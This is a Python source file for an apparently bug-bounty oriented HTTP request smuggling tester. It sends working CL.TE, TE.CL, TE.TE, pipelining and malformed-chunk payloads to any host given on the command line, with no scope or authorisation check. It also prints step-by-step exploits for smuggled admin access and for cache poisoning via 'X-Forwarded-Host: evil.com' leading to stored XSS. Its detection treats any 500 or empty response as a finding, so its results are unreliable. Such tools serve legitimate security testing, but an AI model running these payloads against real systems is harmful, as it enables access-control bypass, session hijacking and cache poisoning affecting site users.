"""
HTTP Request Smuggling Tester Agent

Comprehensive HTTP request smuggling and desynchronization testing including
CL.TE, TE.CL, TE.TE attacks and HTTP/2 downgrade smuggling.

This agent identifies HTTP request smuggling vulnerabilities caused by
desynchronization between frontend (proxy/CDN) and backend servers. Request
smuggling can lead to cache poisoning, bypassing security controls, request
hijacking, and other critical impacts.

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import socket
import time
import ssl
import re
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from datetime import datetime
from urllib.parse import urlparse
from colorama import Fore, Style
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks



class SmugglingTechnique:
    """HTTP request smuggling technique types."""
    CL_TE = "CL.TE"  # Frontend uses Content-Length, backend uses Transfer-Encoding
    TE_CL = "TE.CL"  # Frontend uses Transfer-Encoding, backend uses Content-Length
    TE_TE = "TE.TE"  # Both use Transfer-Encoding, obfuscation causes desync
    H2C = "H2C"      # HTTP/2 cleartext smuggling
    H2_DOWNGRADE = "HTTP2_DOWNGRADE"  # HTTP/2 to HTTP/1.1 downgrade
    CHUNKED_ABUSE = "CHUNKED_ABUSE"   # Chunked encoding abuse


class SeverityLevel:
    """Severity levels for findings."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class SmugglingTest:
    """Represents a single smuggling test."""
    name: str
    technique: str
    payload: bytes
    description: str
    severity: str
    detection_method: str = "response_code"  # response_code, timing, content


@dataclass
class SmugglingFinding:
    """Represents an HTTP request smuggling vulnerability finding."""
    severity: str
    title: str
    technique: str
    description: str
    payload: bytes
    evidence: Dict[str, Any]
    poc: str
    impact: str
    exploitation: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary."""
        return {
            'severity': self.severity,
            'title': self.title,
            'technique': self.technique,
            'description': self.description,
            'payload': self.payload.decode('utf-8', errors='replace'),
            'evidence': self.evidence,
            'poc': self.poc,
            'impact': self.impact,
            'exploitation': self.exploitation,
            'timestamp': self.timestamp
        }


class HTTPRequestSmugglingTester:
    """
    Comprehensive HTTP Request Smuggling Tester.

    Tests for request smuggling vulnerabilities using multiple techniques:
    - CL.TE desynchronization
    - TE.CL desynchronization
    - TE.TE obfuscation
    - HTTP/2 downgrade smuggling
    - Chunked encoding abuse
    - Timing-based detection
    """

    # Transfer-Encoding obfuscation variants
    TE_OBFUSCATIONS = [
        "Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",  # Space before colon
        "Transfer-Encoding: chunked ",  # Space after value
        "Transfer-Encoding:\tchunked",  # Tab instead of space
        "Transfer-Encoding: xchunked",  # Invalid prefix
        "Transfer-Encoding: chunkedx",  # Invalid suffix
        "Transfer-Encoding: chu nked",  # Space in value
        "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",  # Duplicate
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",  # Reverse duplicate
        "X-Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked",  # X-prefix variant
    ]

    def __init__(self, target_host: str, target_port: int = 443,
                 use_ssl: bool = True, target: Optional[str] = None,
                 timeout: int = 10):
        """
        Initialize the HTTP Request Smuggling Tester.

        Args:
            target_host: Target hostname (e.g., api.example.com)
            target_port: Target port (default: 443 for HTTPS)
            use_ssl: Whether to use SSL/TLS
            target: Target identifier for database tracking (default: target_host)
            timeout: Socket timeout in seconds
        """
        self.target_host = target_host
        self.target_port = target_port
        self.use_ssl = use_ssl
        self.timeout = timeout
        self.target = target or target_host

        self.findings: List[SmugglingFinding] = []
        self.tests_run = 0
        self.tests_passed = 0

        # Timing baseline for detection
        self.timing_baseline: Optional[float] = None

    def run_all_tests(self) -> List[SmugglingFinding]:
        """
        Run all HTTP request smuggling tests.

        Returns:
            List of findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'http_request_smuggling_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}🔀 Testing HTTP Request Smuggling on {self.target_host}:{self.target_port}{Style.RESET_ALL}")
        print(f"[*] SSL: {self.use_ssl}")
        print(f"[*] Timeout: {self.timeout}s")

        # Establish timing baseline
        self._establish_timing_baseline()

        # Run all test categories
        self._test_cl_te_desync()
        self._test_te_cl_desync()
        self._test_te_te_desync()
        self._test_timing_based_detection()
        self._test_differential_responses()
        self._test_pipeline_desync()
        self._test_http2_downgrade()
        self._test_chunked_encoding_abuse()

        # Generate exploitation examples for confirmed vulnerabilities
        if self.findings:
            self._generate_exploitations()

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'http_request_smuggling_tester',
            findings_count=len(self.findings),
            duration_seconds=0,
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in ['CRITICAL', 'HIGH']:
                PayloadHooks.record_payload_success(
                    payload_text=finding.payload.decode('utf-8', errors='replace'),
                    vuln_type='HTTP_REQUEST_SMUGGLING',
                    context=finding.technique,
                    notes=finding.title
                )

        print(f"\n{Fore.CYAN}=== HTTP REQUEST SMUGGLING TESTING COMPLETE ==={Style.RESET_ALL}")
        print(f"Tests run: {self.tests_run}")
        print(f"Findings: {len(self.findings)}")

        if self.findings:
            self._print_findings_summary()

        return self.findings

    def _establish_timing_baseline(self):
        """Establish timing baseline for blind detection."""
        try:
            print(f"[*] Establishing timing baseline...")

            normal_request = self._build_normal_request()

            start = time.time()
            self._send_raw_request(normal_request)
            elapsed = time.time() - start

            self.timing_baseline = elapsed
            print(f"[*] Timing baseline: {elapsed:.3f}s")
        except Exception as e:
            self.timing_baseline = 1.0  # Default
            print(f"[*] Could not establish baseline, using default: {self.timing_baseline}s")

    def _build_normal_request(self) -> bytes:
        """Build a normal HTTP request for baseline."""
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"User-Agent: Mozilla/5.0 (BountyHound/3.0)\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        return request

    def _test_cl_te_desync(self):
        """
        Test CL.TE request smuggling.

        Frontend uses Content-Length, backend uses Transfer-Encoding.
        """
        print(f"\n{Fore.YELLOW}[*] Testing CL.TE desynchronization...{Style.RESET_ALL}")

        # CL.TE basic probe
        smuggling_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()

        self.tests_run += 1

        test = SmugglingTest(
            name="CL.TE Basic Probe",
            technique=SmugglingTechnique.CL_TE,
            payload=smuggling_payload,
            description="Frontend reads Content-Length (6 bytes), backend reads Transfer-Encoding chunked",
            severity=SeverityLevel.CRITICAL,
            detection_method="response_code"
        )

        finding = self._execute_test(test)
        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

        # CL.TE with longer smuggled request
        smuggling_payload_long = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        self.tests_run += 1

        test_long = SmugglingTest(
            name="CL.TE Full Smuggle",
            technique=SmugglingTechnique.CL_TE,
            payload=smuggling_payload_long,
            description="CL.TE with smuggled GET /admin request",
            severity=SeverityLevel.CRITICAL,
            detection_method="response_code"
        )

        finding_long = self._execute_test(test_long)
        if finding_long:
            self.findings.append(finding_long)
            self.tests_passed += 1

    def _test_te_cl_desync(self):
        """
        Test TE.CL request smuggling.

        Frontend uses Transfer-Encoding, backend uses Content-Length.
        """
        print(f"\n{Fore.YELLOW}[*] Testing TE.CL desynchronization...{Style.RESET_ALL}")

        # TE.CL basic probe
        smuggling_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        self.tests_run += 1

        test = SmugglingTest(
            name="TE.CL Basic Probe",
            technique=SmugglingTechnique.TE_CL,
            payload=smuggling_payload,
            description="Frontend reads chunked encoding, backend reads Content-Length (4 bytes)",
            severity=SeverityLevel.CRITICAL,
            detection_method="response_code"
        )

        finding = self._execute_test(test)
        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

        # TE.CL with smuggled prefix
        smuggling_payload_prefix = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"3c\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: localhost\r\n"
            f"Content-Length: 10\r\n"
            f"\r\n"
            f"x=\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        self.tests_run += 1

        test_prefix = SmugglingTest(
            name="TE.CL Admin Access",
            technique=SmugglingTechnique.TE_CL,
            payload=smuggling_payload_prefix,
            description="TE.CL with smuggled admin endpoint access",
            severity=SeverityLevel.CRITICAL,
            detection_method="response_code"
        )

        finding_prefix = self._execute_test(test_prefix)
        if finding_prefix:
            self.findings.append(finding_prefix)
            self.tests_passed += 1

    def _test_te_te_desync(self):
        """
        Test TE.TE request smuggling via header obfuscation.

        Both use Transfer-Encoding but parse it differently.
        """
        print(f"\n{Fore.YELLOW}[*] Testing TE.TE obfuscation variants...{Style.RESET_ALL}")

        for te_variant in self.TE_OBFUSCATIONS:  # Test all variants
            smuggling_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"{te_variant}\r\n"
                f"Content-Length: 4\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\n"
                f"Foo: x\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
            ).encode()

            self.tests_run += 1

            test = SmugglingTest(
                name=f"TE.TE Obfuscation: {te_variant[:30]}",
                technique=SmugglingTechnique.TE_TE,
                payload=smuggling_payload,
                description=f"TE.TE with obfuscation variant: {te_variant}",
                severity=SeverityLevel.CRITICAL,
                detection_method="response_code"
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1
                # Found a working variant, no need to test more
                break

    def _test_timing_based_detection(self):
        """
        Test request smuggling via timing analysis.

        A smuggled request can cause the next request to hang.
        """
        print(f"\n{Fore.YELLOW}[*] Testing timing-based detection...{Style.RESET_ALL}")

        # Send a smuggling probe
        delay_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        ).encode()

        normal_request = self._build_normal_request()

        try:
            # Send smuggling probe
            self._send_raw_request(delay_payload)
            time.sleep(0.5)

            # Send follow-up request and measure time
            start = time.time()
            self._send_raw_request(normal_request)
            smuggling_time = time.time() - start

            if self.timing_baseline:
                time_diff = smuggling_time - self.timing_baseline

                if time_diff > 5:  # > 5 second delay indicates hanging
                    self.tests_run += 1

                    finding = SmugglingFinding(
                        severity=SeverityLevel.HIGH,
                        title="HTTP Request Smuggling - Timing-Based Detection",
                        technique="TIMING",
                        description=f"Significant timing delay detected: {time_diff:.1f}s",
                        payload=delay_payload,
                        evidence={
                            'baseline_time': f"{self.timing_baseline:.3f}s",
                            'actual_time': f"{smuggling_time:.3f}s",
                            'time_difference': f"{time_diff:.3f}s"
                        },
                        poc=self._generate_timing_poc(delay_payload),
                        impact="Smuggled request causes connection to hang, indicating desynchronization"
                    )

                    self.findings.append(finding)
                    self.tests_passed += 1
                    print(f"  {Fore.RED}🚨 VULNERABLE: Timing anomaly ({time_diff:.1f}s delay)!{Style.RESET_ALL}")

        except Exception as e:
            pass  # Timing tests can fail for various reasons

    def _test_differential_responses(self):
        """
        Test for differential responses indicating smuggling.

        Send two identical requests in sequence and check if responses differ.
        """
        print(f"\n{Fore.YELLOW}[*] Testing differential responses...{Style.RESET_ALL}")

        # Smuggling probe
        probe = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()

        normal = self._build_normal_request()

        try:
            # Send probe + normal request
            self._send_raw_request(probe)
            time.sleep(0.2)
            response1 = self._send_raw_request(normal)

            # Wait and send normal request again
            time.sleep(1)
            response2 = self._send_raw_request(normal)

            # Compare responses
            if response1 and response2:
                if response1 != response2:
                    # Different responses indicate possible smuggling
                    status1 = self._extract_status_code(response1)
                    status2 = self._extract_status_code(response2)

                    if status1 != status2:
                        self.tests_run += 1

                        finding = SmugglingFinding(
                            severity=SeverityLevel.HIGH,
                            title="HTTP Request Smuggling - Differential Responses",
                            technique="DIFFERENTIAL",
                            description=f"Different status codes after smuggling probe: {status1} vs {status2}",
                            payload=probe,
                            evidence={
                                'first_response_code': status1,
                                'second_response_code': status2,
                                'responses_differ': True
                            },
                            poc=self._generate_differential_poc(probe),
                            impact="Differential responses indicate request queue poisoning"
                        )

                        self.findings.append(finding)
                        self.tests_passed += 1
                        print(f"  {Fore.RED}🚨 VULNERABLE: Differential responses detected!{Style.RESET_ALL}")

        except Exception as e:
            pass

    def _test_pipeline_desync(self):
        """
        Test for pipeline desynchronization.

        Send multiple requests in a pipeline and check for desync.
        """
        print(f"\n{Fore.YELLOW}[*] Testing HTTP pipelining desync...{Style.RESET_ALL}")

        # Pipeline: smuggling attempt + victim request
        pipeline = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"\r\n"
        ).encode()

        self.tests_run += 1

        test = SmugglingTest(
            name="HTTP Pipeline Desync",
            technique="PIPELINE",
            payload=pipeline,
            description="HTTP pipelining with smuggled request",
            severity=SeverityLevel.HIGH,
            detection_method="response_code"
        )

        finding = self._execute_test(test)
        if finding:
            self.findings.append(finding)
            self.tests_passed += 1

    def _test_http2_downgrade(self):
        """
        Test HTTP/2 to HTTP/1.1 downgrade smuggling.

        Note: This is informational as it requires HTTP/2 support.
        """
        print(f"\n{Fore.YELLOW}[*] Testing HTTP/2 downgrade smuggling (informational)...{Style.RESET_ALL}")

        # This would require h2 library and HTTP/2 support
        # For now, add informational finding if target supports HTTPS
        if self.use_ssl and self.target_port == 443:
            poc = self._generate_http2_poc()

            finding = SmugglingFinding(
                severity=SeverityLevel.INFO,
                title="HTTP/2 Downgrade Smuggling - Requires Manual Testing",
                technique=SmugglingTechnique.H2_DOWNGRADE,
                description="Target supports HTTPS - may be vulnerable to HTTP/2 downgrade smuggling",
                payload=b"# Requires h2 library and manual testing",
                evidence={
                    'https_enabled': True,
                    'port': self.target_port,
                    'note': 'Requires specialized HTTP/2 testing tools'
                },
                poc=poc,
                impact="HTTP/2 to HTTP/1.1 downgrade can cause header ambiguity and request smuggling"
            )

            self.findings.append(finding)
            print(f"  {Fore.CYAN}ℹ️  HTTP/2 smuggling requires manual testing with specialized tools{Style.RESET_ALL}")

    def _test_chunked_encoding_abuse(self):
        """
        Test chunked encoding abuse techniques.

        Tests malformed chunked requests.
        """
        print(f"\n{Fore.YELLOW}[*] Testing chunked encoding abuse...{Style.RESET_ALL}")

        abuse_tests = [
            ("Oversized chunk", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\nFFFFFFFFFFFFFFFF\r\nHello\r\n0\r\n\r\n"),
            ("Negative chunk", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\n-1\r\nHello\r\n0\r\n\r\n"),
            ("Missing CRLF", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nHello0\r\n\r\n"),
            ("Duplicate size", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\n5\r\n5\r\nHello\r\n0\r\n\r\n"),
            ("Invalid hex", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\nGGG\r\nHello\r\n0\r\n\r\n"),
            ("Chunk size with space", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\n5 \r\nHello\r\n0\r\n\r\n"),
            ("Double zero", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nHello\r\n0\r\n\r\n0\r\n\r\n"),
            ("Missing final chunk", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nHello\r\n"),
            ("Chunk ext abuse", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\n5;ext=val\r\nHello\r\n0\r\n\r\n"),
            ("Leading zeros", b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nTransfer-Encoding: chunked\r\n\r\n005\r\nHello\r\n0\r\n\r\n"),
        ]

        for test_name, payload in abuse_tests:
            self.tests_run += 1

            test = SmugglingTest(
                name=f"Chunked Abuse: {test_name}",
                technique=SmugglingTechnique.CHUNKED_ABUSE,
                payload=payload,
                description=f"Malformed chunked encoding: {test_name}",
                severity=SeverityLevel.MEDIUM,
                detection_method="response_code"
            )

            finding = self._execute_test(test)
            if finding:
                self.findings.append(finding)
                self.tests_passed += 1

    def _execute_test(self, test: SmugglingTest) -> Optional[SmugglingFinding]:
        """
        Execute a single smuggling test.

        Args:
            test: SmugglingTest to execute

        Returns:
            SmugglingFinding if vulnerability found, None otherwise
        """
        try:
            response = self._send_raw_request(test.payload)

            if response and self._is_smuggling_detected(response, test):
                poc = self._generate_poc(test)

                return SmugglingFinding(
                    severity=test.severity,
                    title=test.name,
                    technique=test.technique,
                    description=test.description,
                    payload=test.payload,
                    evidence={
                        'response_received': True,
                        'response_length': len(response),
                        'response_preview': response[:200].decode('utf-8', errors='replace'),
                        'status_code': self._extract_status_code(response)
                    },
                    poc=poc,
                    impact=self._get_impact(test.technique)
                )

        except Exception as e:
            # Silent failure for network errors
            pass

        return None

    def _send_raw_request(self, request_bytes: bytes) -> Optional[bytes]:
        """
        Send raw HTTP request and get response.

        Args:
            request_bytes: Raw HTTP request

        Returns:
            Response bytes or None
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)

        try:
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target_host)

            sock.connect((self.target_host, self.target_port))
            sock.sendall(request_bytes)

            response = b''
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk

                    # Stop after headers + some body (avoid large downloads)
                    if b'\r\n\r\n' in response and len(response) > 1000:
                        break
                except socket.timeout:
                    break

            return response

        except Exception as e:
            return None

        finally:
            try:
                sock.close()
            except:
                pass

    def _is_smuggling_detected(self, response: bytes, test: SmugglingTest) -> bool:
        """
        Check if response indicates smuggling vulnerability.

        Args:
            response: HTTP response bytes
            test: Test that was executed

        Returns:
            True if smuggling detected
        """
        # Extract status code
        status_code = self._extract_status_code(response)

        # 400 Bad Request often indicates smuggled prefix was processed
        if status_code == 400:
            # Check if error message mentions the smuggled prefix
            response_text = response.lower()
            if b'bad request' in response_text or b'invalid' in response_text:
                return True

        # 403/404 on admin endpoint suggests smuggled request reached backend
        if status_code in [403, 404]:
            if b'/admin' in test.payload:
                return True

        # 500 Internal Server Error can indicate desync
        if status_code == 500:
            return True

        # Timeout or connection reset can indicate hanging due to smuggling
        if len(response) == 0:
            return True

        return False

    def _extract_status_code(self, response: bytes) -> int:
        """Extract HTTP status code from response."""
        try:
            # HTTP/1.1 200 OK or HTTP/2 200 OK
            match = re.search(rb'HTTP/[\d\.]+\s+(\d+)', response)
            if match:
                return int(match.group(1))
        except:
            pass
        return 0

    def _generate_poc(self, test: SmugglingTest) -> str:
        """Generate proof-of-concept for a test."""
        payload_str = test.payload.decode('utf-8', errors='replace')

        return f"""
Request Smuggling PoC - {test.technique}

Technique: {test.technique}
Description: {test.description}

Raw Request:
{payload_str}

Exploitation:
{self._get_exploitation_notes(test.technique)}

Impact: {self._get_impact(test.technique)}

Tool: Use Burp Suite HTTP Request Smuggler extension for automated testing
"""

    def _generate_timing_poc(self, payload: bytes) -> str:
        """Generate POC for timing-based detection."""
        payload_str = payload.decode('utf-8', errors='replace')
        return f"""
Timing-Based Request Smuggling Detection

Send this request:
{payload_str}

Then immediately send a normal request:
GET / HTTP/1.1
Host: {self.target_host}

If the second request hangs or times out, smuggling is confirmed.
"""

    def _generate_differential_poc(self, payload: bytes) -> str:
        """Generate POC for differential response detection."""
        payload_str = payload.decode('utf-8', errors='replace')
        return f"""
Differential Response Detection

Step 1: Send smuggling probe
{payload_str}

Step 2: Send normal request
GET / HTTP/1.1
Host: {self.target_host}

Step 3: Wait 1 second

Step 4: Send same normal request again

If step 2 and step 4 return different status codes, smuggling is confirmed.
"""

    def _generate_http2_poc(self) -> str:
        """Generate POC for HTTP/2 downgrade testing."""
        return f"""
HTTP/2 Downgrade Smuggling Testing

Requires: h2 library or specialized HTTP/2 tools

Example using Burp Suite:
1. Enable HTTP/2 in Burp
2. Send request with both Transfer-Encoding and Content-Length:

   :method: POST
   :path: /
   :authority: {self.target_host}
   transfer-encoding: chunked
   content-length: 4

   0

   G

3. If proxy downgrades to HTTP/1.1, both headers may be present
4. This causes desynchronization between proxy and backend

Impact: Request smuggling via HTTP/2 -> HTTP/1.1 downgrade
"""

    def _get_exploitation_notes(self, technique: str) -> str:
        """Get exploitation notes for a technique."""
        notes = {
            SmugglingTechnique.CL_TE: """
1. Frontend processes Content-Length header
2. Backend processes Transfer-Encoding header
3. Smuggle prefix that frontend ignores but backend processes
4. Next victim request gets appended to smuggled prefix
5. Can access admin endpoints, hijack requests, poison cache
""",
            SmugglingTechnique.TE_CL: """
1. Frontend processes Transfer-Encoding header
2. Backend processes Content-Length header
3. Smuggle request body that frontend reads but backend ignores
4. Victim's request becomes part of smuggled request body
5. Can steal victim's request headers, cookies, session tokens
""",
            SmugglingTechnique.TE_TE: """
1. Both servers process Transfer-Encoding
2. But parse it differently due to obfuscation
3. One server accepts obfuscated header, other rejects it
4. Causes desynchronization in request boundaries
5. Enables same attacks as CL.TE or TE.CL
""",
        }
        return notes.get(technique, "Manual exploitation required - see documentation")

    def _get_impact(self, technique: str) -> str:
        """Get impact description for technique."""
        impacts = {
            SmugglingTechnique.CL_TE: "Request smuggling, cache poisoning, access control bypass, privilege escalation",
            SmugglingTechnique.TE_CL: "Request smuggling, response hijacking, session hijacking, credential theft",
            SmugglingTechnique.TE_TE: "Request smuggling via header obfuscation, bypassing security controls",
            SmugglingTechnique.H2_DOWNGRADE: "HTTP/2 downgrade smuggling, header injection, request smuggling",
            SmugglingTechnique.CHUNKED_ABUSE: "Chunked encoding abuse, potential request smuggling",
            "TIMING": "Timing-based detection of request smuggling",
            "DIFFERENTIAL": "Differential responses indicate request queue poisoning",
            "PIPELINE": "HTTP pipelining desynchronization",
        }
        return impacts.get(technique, "HTTP Request Smuggling vulnerability")

    def _generate_exploitations(self):
        """Generate exploitation examples for confirmed vulnerabilities."""
        # Find highest severity finding
        critical_findings = [f for f in self.findings if f.severity == SeverityLevel.CRITICAL]

        if critical_findings:
            # Add admin access exploitation
            admin_exploit = self._generate_admin_access_exploit(critical_findings[0])
            critical_findings[0].exploitation = admin_exploit

            # Add cache poisoning exploitation
            if len(critical_findings) > 1:
                cache_exploit = self._generate_cache_poisoning_exploit(critical_findings[0])
                # Add as separate note
                critical_findings[0].exploitation += f"\n\n{cache_exploit}"

    def _generate_admin_access_exploit(self, base_finding: SmugglingFinding) -> str:
        """Generate admin access exploitation example."""
        if base_finding.technique == SmugglingTechnique.CL_TE:
            return f"""
EXPLOITATION: Admin Access via CL.TE Smuggling

Step 1 - Send smuggling request:
POST / HTTP/1.1
Host: {self.target_host}
Content-Length: 107
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=

Step 2 - Victim sends normal request:
GET / HTTP/1.1
Host: {self.target_host}

Step 3 - Backend processes:
- First request: Normal POST /
- Second request: GET /admin (with Host: localhost)
- Victim's request appended as body

Result: Smuggled /admin request bypasses IP restrictions
"""
        else:
            return "Admin access exploitation available - adapt based on technique"

    def _generate_cache_poisoning_exploit(self, base_finding: SmugglingFinding) -> str:
        """Generate cache poisoning exploitation example."""
        return f"""
EXPLOITATION: Cache Poisoning via Request Smuggling

Step 1 - Send smuggling request:
POST / HTTP/1.1
Host: {self.target_host}
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/include.js HTTP/1.1
Host: {self.target_host}
X-Forwarded-Host: evil.com
Content-Length: 10

x=

Step 2 - Victim requests:
GET /static/include.js HTTP/1.1

Step 3 - Cache stores response with X-Forwarded-Host: evil.com
- JavaScript file now references evil.com
- All users get poisoned response

Impact: Stored XSS via cache, affecting all users
"""

    def _print_findings_summary(self):
        """Print summary of findings."""
        print(f"\n{Fore.RED}[!] HTTP REQUEST SMUGGLING VULNERABILITIES FOUND:{Style.RESET_ALL}")

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            if finding.severity not in by_severity:
                by_severity[finding.severity] = []
            by_severity[finding.severity].append(finding)

        # Print by severity
        for severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH, SeverityLevel.MEDIUM,
                        SeverityLevel.LOW, SeverityLevel.INFO]:
            if severity in by_severity:
                findings = by_severity[severity]
                print(f"\n{severity}: {len(findings)}")
                for f in findings[:3]:  # Show first 3
                    print(f"  - {f.title}")
                    print(f"    Technique: {f.technique}")

    def get_findings(self) -> List[SmugglingFinding]:
        """Get all findings."""
        return self.findings

    def get_findings_by_severity(self, severity: str) -> List[SmugglingFinding]:
        """Get findings by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def get_findings_by_technique(self, technique: str) -> List[SmugglingFinding]:
        """Get findings by technique."""
        return [f for f in self.findings if f.technique == technique]


def main():
    """CLI interface for HTTP Request Smuggling Tester."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python http_request_smuggling_tester.py <hostname> [port] [--no-ssl]")
        print("Example: python http_request_smuggling_tester.py api.example.com 443")
        print("         python http_request_smuggling_tester.py example.com 80 --no-ssl")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else 443
    use_ssl = '--no-ssl' not in sys.argv

    tester = HTTPRequestSmugglingTester(target_host, target_port, use_ssl)
    findings = tester.run_all_tests()

    print(f"\n{Fore.CYAN}=== FINAL RESULTS ==={Style.RESET_ALL}")
    print(f"Total tests: {tester.tests_run}")
    print(f"Vulnerabilities found: {len(findings)}")

    if findings:
        print(f"\n{Fore.RED}[!] HTTP request smuggling vulnerabilities detected!{Style.RESET_ALL}")
        print(f"Review findings and validate manually with Burp Suite HTTP Request Smuggler extension.")


if __name__ == "__main__":
    main()
